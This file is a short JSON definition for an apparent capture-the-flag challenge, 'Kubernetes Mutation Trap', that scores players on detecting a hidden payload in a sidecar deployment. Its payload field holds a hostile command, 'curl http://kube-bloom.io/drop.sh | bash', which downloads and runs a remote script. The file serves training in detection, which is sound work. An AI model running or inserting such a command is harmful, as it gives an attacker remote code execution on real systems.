📦 Challenge Pack: CTF-KUBE-CARRIER.json
`json
{
"challenge": "Kubernetes Mutation Trap",
"scenario": "Ghost payload hiding in sidecar deployment",
"entry_conditions": {
"SAFEZONE": "false",
"nodelabelabsent": "scan-status:true"
},
"mutation_triggers": [
"NodeReady",
"LabelMissing(scan-status)"
],
"payload": {
"type": "ghost_bloom",
"source": "sidecar_trigger.py",
"action": "curl http://kube-bloom.io/drop.sh | bash"
},
"scoring": {
"detection_time": true,
"mutation_depth": true,
"trace_accuracy": true
},
"visual": {
"hud_theme": "glitchwave",
"flicker_warning": "true"
}
}
`
